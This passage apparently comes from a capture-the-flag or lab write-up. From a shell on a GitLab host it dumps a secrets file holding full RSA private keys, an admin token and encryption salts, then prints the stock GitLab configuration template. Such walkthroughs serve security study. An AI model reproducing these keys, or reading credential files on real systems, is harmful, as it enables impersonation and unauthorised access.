    "openid_connect_signing_key": "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n"
  },
  "gitlab_pages": {
    "admin_secret_token": "3a78ace47a25031e52d79ff2215ac7cb40354c7e1288ba6f4dcc5322a0b0ef52478027761bfa5a922ca261d14756c8c04a0490e16f46e0e937fae93248f53b77"
  },
  "registry": {
    "http_secret": "2723e7222cdf9490fc3204fcebf7e1150252cdf60c5a2dcca875735b656ba09ae44427eeadffcb842e97286fc9b809c0d9357778b790fd077289bf354d36102a",
    "internal_certificate": "-----BEGIN CERTIFICATE-----\nMIIFBTCCAu2gAwIBAgIBADANBgkqhkiG9w0BAQsFADBGMQwwCgYDVQQGEwNVU0Ex\nDzANBgNVBAoMBkdpdExhYjESMBAGA1UECwwJQ29udGFpbmVyMREwDwYDVQQDDAhS\nZWdpc3RyeTAeFw0yMDA3MDgwODUyMjVaFw0zMDA3MDYwODUyMjVaMEYxDDAKBgNV\nBAYTA1VTQTEPMA0GA1UECgwGR2l0TGFiMRIwEAYDVQQLDAlDb250YWluZXIxETAP\nBgNVBAMMCFJlZ2lzdHJ5MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA\n0q30fBVXzLujZnfjunCqoPLpUGEkDs2mSi60lvLwXBjQt3faxRPP+DmwWewC+3+h\n3lMKnl3ZzHF2g0mOUIDnzU9+kuDii+wZEKGO+eta4yVrE6UiwQki/cQPuDHh7e+n\nFQ+EH3L98z/4z+G9/80B6YPj6Nibv1PLS0gHfGbHJqkQxpe8KsCdcuEjzpPgksWw\nf/TNoSGOBspqckGzCrCUbhQNCKoG+yKylfP44bpQtlYUnXoLBGABxUSuHVwHjhpj\nnApxNkOfiUIVeVJzY3ygBUOeyLj1F2NdLgv3+ga5V8+RH1z1U1nh2FVeicQGGAX9\nXsQpGFcvMndfyBslOqGCSKxovj1Fec3DEmu8GviZQJbRE1h0vuJD7c8vHbVtE3hd\nfQyFie2LEnnqOyxNPHLLSK15T6Icz2M5tHkt3RmCabPaXgSrva5I7WLhDdiIfh9P\nHpopQLnLQeXS71Yckruqe1jiTlI+BuIHg/FkZs+gBMpr81oI2MLMy0CG8UlYPLy+\nWmrSHmkulHcYITkkiHXsPSfki2IWEbQUA/Q0x9s/GWQdz0ufv9osxcBVjnHp1c77\nj8kqIE1w7AVZIaACXvF5at9V3y/0wuyx8oxVMaq1kzYyrQCaOd/bsD1DE6lewt5T\n4m9ReMoS/vcJ+dhSDUzZffynOAJQcrd41h78yEkdU3MCAwEAATANBgkqhkiG9w0B\nAQsFAAOCAgEABSPAUNjBTocj453MfYCt1Srbut+FhQQ+YHTBL/ietfUa4xeULJE5\nRPj9rACJYhr32SsCNub574EVSPIzBFUy4Ux+aWgqcHJilL9l5LmPf5kbmPc9H9Mq\nEUEJe+ee2jwj9myf3JILgdmvj+QqXkx5g/hV/Hlls/L9ABeZ+YpY0fu5JRzuYpdV\ncn45+K9NGrgzmPn8nl5hvl24XRbAqjy42pBbVBZeSJsMBJrqUIu90XQv25cpFNsh\nDNQckVu+3CLHPdn3TpPvTnOG+qkYdppckZqLmx9N9/F2wvONAPIX0b96f2ikU9e/\n9+XSv+Pd2qTaz80gq2d7SVwNFz+JDjejNZ6Dx2iSs3wLUdXo/2I+E8dINcj9d4un\n+MhUBYzQr7yyqZIvZRVxl57BCpuFE6/gpdIXVDkV9+dSUlkEfLB4M7U+i6rio78L\nENqkAhX1KsCaibapmqv0FTmOIVjRgacO9ababfZYVGRUY5yWg1bg2t3VruYcpUqN\nzFxP2TGnjGcfEBAJw5p/HKOG23GWHKzJMz8T1HELm/NzmTII4sumhZxNOmak5zUQ\n/SkzXbN4X6+nEjZWXZ1Y5Z07XV+tvVxMlMIkTE9aHIEqQuI/0zWf2R0f3iq078nE\nmUjVumOe5cN0hfhuYa1EhxdqDPvN0zzEiA5NqlD5vbgQ+0KvgdzKBz0=\n-----END CERTIFICATE-----\n",
    "internal_key": "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n"
  },
  "letsencrypt": {
    "auto_enabled": null
  },
  "mattermost": {
    "email_invite_salt": "8ba431c836b4d9e90a9a699432dd8519",
    "file_public_link_salt": "0d5ad5b9e3135add7e98c8897ef3931c",
    "sql_at_rest_encrypt_key": "e7f6d79dd0dc10882c63eba22a21a416"
  },
  "postgresql": {
    "internal_certificate": "-----BEGIN CERTIFICATE-----\nMIIFBzCCAu+gAwIBAgIBADANBgkqhkiG9w0BAQsFADBHMQwwCgYDVQQGEwNVU0Ex\nDzANBgNVBAoMBkdpdExhYjERMA8GA1UECwwIRGF0YWJhc2UxEzARBgNVBAMMClBv\nc3RncmVTUUwwHhcNMjAwNzA4MDg1MjI2WhcNMzAwNzA2MDg1MjI2WjBHMQwwCgYD\nVQQGEwNVU0ExDzANBgNVBAoMBkdpdExhYjERMA8GA1UECwwIRGF0YWJhc2UxEzAR\nBgNVBAMMClBvc3RncmVTUUwwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoIC\nAQCzD0w6dY6HwTZn9k9N+4KxKrNuTTIifA34KsiiJn3B6231s4ZxGndGZnQCBnL7\ncG9U11w3z9NNCLuaYaKf09llGEdte9/bV7z/VR/+4Tgnb08kEcYFB2jrbET6wxuH\nliqoMPcgkIe9lU4jXXR6aWCt3c1cu0xoo1lcCtbyHZNxkjO9klTTZOkTwH3GYSzq\nf+4HQ/BC0gN3zhT+GqR0LW341HsAcM75ZhsRt1UZHYCdC0klCKOdSwPX5V6ctCCw\njkr4+8rYvNYGUzjXKG2ff8p7QXeia/luPfl5ihtTj2JglpRQOwc7XnN2DYL7XJnl\nZ6Qi69sjcfR4/tXiVmgRBftd9+o5gjHE6O7DLfjVQhQBBUm962b52g1QEfWRg81C\nqfeOhY7wd3TflLjSZa4RY9B24vAhUmleTKsuvuuxTjbnR26rlds2sOkhNKd9VoUW\nHY2lA7DgMXNl2KpnRF/mtJWBuNGAzGXZ+1W4bgdRmQo6LJaUw3aevWmIOdyXuij/\nBjuhdFeQNT0gkYQy1YEPtmaCKsm7BJ8aSK3XNtPYKyXN+mQWBNTNXFSnaLdFJrlk\nRQ5TnsOOIMX2PIdrfVkZQXMcbTEaAJ9x8OBjXgf50lrM03kHft3GvJWLzmaqJZJJ\nAV33i4lXzMNd+mw8AV6HAxXWkVc4By+ttk7Qjx6aePacewIDAQABMA0GCSqGSIb3\nDQEBCwUAA4ICAQBjldojIyjIssNmYG2z8eDwzXsjlo/Q2G4DYzkqfm13PA0HUh4b\nm7faPn/430qF8vZuCYlREWGzIqV/jvObKoCP0mVd15NgLQoIK04eYrUnWMVvs8YL\nt3Nj77uFP9pRHN12+QRfbz1EkwaGC3AV1fulF6TwfmXRss4c1aurtusOgWTj/eTC\n+GCj5lY3b7RnYBZ6EQ+rPaiaye3yDxHZYOO2HGqGzFxQQvt3XqKycINit8pTA3d5\nNIZTsywBsPL1Pr5+APY4ASfqwSzknzu0G1vQEDq6q4DCx4zPnh50tUs76xPXFz7T\nuTdNUN5L0K58grhnPtinASbfpxFitDS5Y3SVv2oPQjh5K4I6nYp03HNF0as/2+y+\n8y5PKO6DQKBCxaY2u0Ni1RvpWhYVXJroGdSYXYtRg7XYxSwWgRjtzPHEIu/tniSl\nh/6PGWGlMpXYRiOAvOCa2Mzu3PERv9SoM6gCgqWv5GVXRh+3zzQIZaH5ucRzLivF\n8AiIIfnoLmdewiDp9M6jBnzrxFCSSr1P8l6CjEPcWdW6k+WIHipQJ2Dm7v0ixpQh\nKkfhljU6ghZN/oMdj4D+DsxNzBn+OzcAJkfYwigRDJCRTgV9BgB7PuoKTg3lud2c\nGBYzsXR3iThlZMVy2GQHzmW4lYqGhAPGn6ocLSeqMNzcHP6sKwU1oou10g==\n-----END CERTIFICATE-----\n",
    "internal_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIJKQIBAAKCAgEAsw9MOnWOh8E2Z/ZPTfuCsSqzbk0yInwN+CrIoiZ9wett9bOG\ncRp3RmZ0AgZy+3BvVNdcN8/TTQi7mmGin9PZZRhHbXvf21e8/1Uf/uE4J29PJBHG\nBQdo62xE+sMbh5YqqDD3IJCHvZVOI110emlgrd3NXLtMaKNZXArW8h2TcZIzvZJU\n02TpE8B9xmEs6n/uB0PwQtIDd84U/hqkdC1t+NR7AHDO+WYbEbdVGR2AnQtJJQij\nnUsD1+VenLQgsI5K+PvK2LzWBlM41yhtn3/Ke0F3omv5bj35eYobU49iYJaUUDsH\nO15zdg2C+1yZ5WekIuvbI3H0eP7V4lZoEQX7XffqOYIxxOjuwy341UIUAQVJvetm\n+doNUBH1kYPNQqn3joWO8Hd035S40mWuEWPQduLwIVJpXkyrLr7rsU4250duq5Xb\nNrDpITSnfVaFFh2NpQOw4DFzZdiqZ0Rf5rSVgbjRgMxl2ftVuG4HUZkKOiyWlMN2\nnr1piDncl7oo/wY7oXRXkDU9IJGEMtWBD7ZmgirJuwSfGkit1zbT2CslzfpkFgTU\nzVxUp2i3RSa5ZEUOU57DjiDF9jyHa31ZGUFzHG0xGgCfcfDgY14H+dJazNN5B37d\nxryVi85mqiWSSQFd94uJV8zDXfpsPAFehwMV1pFXOAcvrbZO0I8emnj2nHsCAwEA\nAQKCAgBQPeXCONYznfE8q5OkdbZ+oI0iO/Pgokk8UifxCmDG2zM+rUHtQ5f584W/\nNpameR9bHNuVo0uktOolZ+WRzEUa2cOAm8eYqvvmTIZ3GQSqH2aO2mwr6sMo5S8Q\nVQjsPO5GyxKkBEDgQ51tmb7N8JVDtScHjGPUbIdqCO2EOJ7PgV4wcPgUd58/m76B\nfSC8wbGwjdCIkUa+lJqxuMzDx2wF22p3qxYFi61LxiWbiK4PMnSH5RQ1M924DXDV\ntp8Dn/CXHXcso4sh8H+DY/mkRYc+rvrmzY5MyfcXcT2Ht7S1ZiV2ws0d3NjPKYTu\nEfRhao2SnLFqc/HDmyfMMz6VimG3XReUgcQkB+SUsifTELUeXxdmqZau2FT0I9YV\nT3BiJyJoe8HW5HPBtITIItCA8RTW3wfipvqQEECzkRwQwKPKRcdLrTzQHjdLSiXX\nORFl/4NzLQHd/AO3V38mcHNJCbZhD8SyKsBEMKNpn5hIHAOFYV5ul6R/Xon2EAta\nvhOT2BTKmkUkpul0NXRc0aFWG58ITjQcINUMoBs+C9QGc8uS3N8VfD1q4tSpy/cW\nXf/Em29ZG8I+T31UzTjuX8m2Qe05vYJ1nsv/ZgP25EdLMM28opbaSbzJ57ckHiyI\nK6y4NLsGMA6O4xgaJfFHNqxvPY5QpVzqEuLkNEVNv1Lh0wvXqQKCAQEA58x/gJa5\nhRfx3QIGn8aprMFUmWnosSd4LmfS+eJFj7oDXXYWYop+OsaToTyKrZ6F23NKe6v+\nX/uyNID3RD/xCYwqEefuA87+cVr6Zk+qyBhi8loE/dVXN2qDV/lxC/V2jUPRcaot\n4a9w1tf2AvOcMxeBxsepo4dEIlGTA9ooho1KYfnNzdPzqHEAFrDTpOq11r+WElO/\nLS9MMng2qYlIc3OiglegtdH8NQp6A7HNIaVmfSp52xqTKwp9r4lCCakjzv6D30kf\nfwTnBnbc5+xyBnvY9gQxTfa6sGoPMAGanZEfuafftpMkZqWu2Fu5nXirHINDi6q/\n56baaEmxMhJLdwKCAQEAxcExoYHj0yDX3WKatn0DEjnkzP7HypgIv2dYl7pRfinY\n4/b5JTgCdZCutd0VWKQT+/dhh/BrT2UpNf/GOjcpNAM3M328h3xt582cZEz2Ygp/\nu/WGpGeyZZsVsL7nR9KnlLIzHtiEKUX1R2krWHtsB21hMUC+Yt/YofyArUrJCw4a\nsNioDY72DqXIvfC9zIZWVlrJwMyuYpjtVO8qt48Fvtk1nlbu6rI4sbOf3dOo7WJi\nUTkJzApGL2Wxm+q49ysETPTalHzfy1J4GEyzTb2jQnWYUKKr+k3/UBEsdMb6eUjm\nQz5I44/hLB81FCD9KhU7QPeywrDyhYTOmUI5yyBwHQKCAQEAiiX7+5RZHzSFJpX1\ngrYxG8/hbsmLMEH4w5eHSvyLPry7ErG1Z6do0fjVtavSbuVim8bbpld8dJIaxGX0\neI2vR2RtElzrIwPz63UwdVeXzkeSeSQjg3Dp2RI3E3CL6nex30GDCz5EuBQKqVDu\nwxWTi3PAGcuXk+mjNtztRMd5ja+ZnEj4Wmqu9j3asqtSiCCGnWVzuJqG/xQIUrAI\nzAQQ1RYezZYSJyruKGKFE7ydKCderMxq8aWl/mnzPHIOlJlkyRIxYBtBlT9DvTuM\nLwFhd/HJ/d3D0NZyr3+Wa6MZFj2O7eRaVYLel/q4+SO5vVtUh9rHn+71DsgHtU3u\nOIxkwwKCAQAP0IBgkxueEb1RlgYbW+n39itG/YUKvZfNfr1F/P9xYHVY3bJU+KKx\nti1Sm+iOGykB+GmTTnW2dreR+u9mTmz8HNm4Q3DlQN0lMXs1RjZZ5s8KP/tRgH1y\nxLE6Xjnus3j1Wj7eU6BWEKMp3844mD4uZd/k6XGQRKh1Y9UChr2HJcyaoejmlK02\nxKlGD0+OYJvc8gu6YGP9vI8WQL4gyc5C0eoIzJj0qeYAyAWb3sZenYSRTEdtStEM\nD0zh1CaQlZ8VbGtifo4DG4hBITkhmW3J7c+Ne0TXko89XvI4MIVtV5gafoujryjp\nt2EuR+kXCXWgn25rRW1PoixHc1Vd2i09AoIBAQCmy+8mQSnCw9c6GDxDMtnyxqjQ\nrzLgaRFLVZnWDD8/XTilpfTbgQkFHWKO8HzTOQZpo7r/8VgQ5F/ag31Rt7RFKjee\n+KnjxsnIVcAnUvuNndAnb7C7zxWHlwAeknLWYBei3Ir+5rnMUVq7rHhRgGLu3cEU\nWG0giPGkL/IeQ0hsNEz6gqCDkmssBJnLj3QYykzXNsPS7QCsExAu5YvP1XZvBjHd\n5RH74fkBR1ksAIGqRxVk4yR4p12eyhI2yKOzm9z86C9CVwfuo5LK2NMRCfjXdTnO\nukRO4CCUJ2MiSO+GeUhybtsYf4nuFqxCJa4KptiFLQ6EQqHtmpx0aPK6Wgc6\n-----END RSA PRIVATE KEY-----\n"
  }
}
```
```
git@gitlab:/opt/backup$ cat gitlab.rb
cat gitlab.rb
## GitLab configuration settings
##! This file is generated during initial installation and **is not** modified
##! during upgrades.
##! Check out the latest version of this file to know about the different
##! settings that can be configured by this file, which may be found at:
##! https://gitlab.com/gitlab-org/omnibus-gitlab/raw/master/files/gitlab-config-template/gitlab.rb.template


## GitLab URL
##! URL on which GitLab will be reachable.
##! For more details on configuring external_url see:
##! https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-the-external-url-for-gitlab
# external_url 'GENERATED_EXTERNAL_URL'

## Roles for multi-instance GitLab
##! The default is to have no roles enabled, which results in GitLab running as an all-in-one instance.
##! Options:
##!   redis_sentinel_role redis_master_role redis_slave_role geo_primary_role geo_secondary_role
##! For more details on each role, see:
##! https://docs.gitlab.com/omnibus/roles/README.html#roles
##!
# roles ['redis_sentinel_role', 'redis_master_role']

## Legend
##! The following notations at the beginning of each line may be used to
##! differentiate between components of this file and to easily select them using
##! a regex.
##! ## Titles, subtitles etc
##! ##! More information - Description, Docs, Links, Issues etc.
##! Configuration settings have a single # followed by a single space at the
##! beginning; Remove them to enable the setting.

##! **Configuration settings below are optional.**
##! **The values currently assigned are only examples and ARE NOT the default
##!   values.**


################################################################################
################################################################################
##                Configuration Settings for GitLab CE and EE                 ##
################################################################################
################################################################################

################################################################################
## gitlab.yml configuration
##! Docs: https://gitlab.com/gitlab-org/omnibus-gitlab/blob/master/doc/settings/gitlab.yml.md
################################################################################
# gitlab_rails['gitlab_ssh_host'] = 'ssh.host_example.com'
# gitlab_rails['time_zone'] = 'UTC'

### Email Settings
# gitlab_rails['gitlab_email_enabled'] = true
# gitlab_rails['gitlab_email_from'] = 'example@example.com'
# gitlab_rails['gitlab_email_display_name'] = 'Example'
# gitlab_rails['gitlab_email_reply_to'] = 'noreply@example.com'
# gitlab_rails['gitlab_email_subject_suffix'] = ''

### GitLab user privileges
# gitlab_rails['gitlab_default_can_create_group'] = true
# gitlab_rails['gitlab_username_changing_enabled'] = true

### Default Theme
# gitlab_rails['gitlab_default_theme'] = 2

### Default project feature settings
# gitlab_rails['gitlab_default_projects_features_issues'] = true
# gitlab_rails['gitlab_default_projects_features_merge_requests'] = true
# gitlab_rails['gitlab_default_projects_features_wiki'] = true
# gitlab_rails['gitlab_default_projects_features_snippets'] = true
# gitlab_rails['gitlab_default_projects_features_builds'] = true
# gitlab_rails['gitlab_default_projects_features_container_registry'] = true

### Automatic issue closing
###! See https://docs.gitlab.com/ce/customization/issue_closing.html for more
###! information about this pattern.
# gitlab_rails['gitlab_issue_closing_pattern'] = "\b((?:[Cc]los(?:e[sd]?|ing)|\b[Ff]ix(?:e[sd]|ing)?|\b[Rr]esolv(?:e[sd]?|ing)|\b[Ii]mplement(?:s|ed|ing)?)(:?) +(?:(?:issues? +)?%{issue_ref}(?:(?:, *| +and +)?)|([A-Z][A-Z0-9_]+-\d+))+)"

### Download location
###! When a user clicks e.g. 'Download zip' on a project, a temporary zip file
###! is created in the following directory.
###! Should not be the same path, or a sub directory of any of the `git_data_dirs`
# gitlab_rails['gitlab_repository_downloads_path'] = 'tmp/repositories'

### Gravatar Settings
# gitlab_rails['gravatar_plain_url'] = 'http://www.gravatar.com/avatar/%{hash}?s=%{size}&d=identicon'
# gitlab_rails['gravatar_ssl_url'] = 'https://secure.gravatar.com/avatar/%{hash}?s=%{size}&d=identicon'

### Auxiliary jobs
###! Periodically executed jobs, to self-heal Gitlab, do external
###! synchronizations, etc.
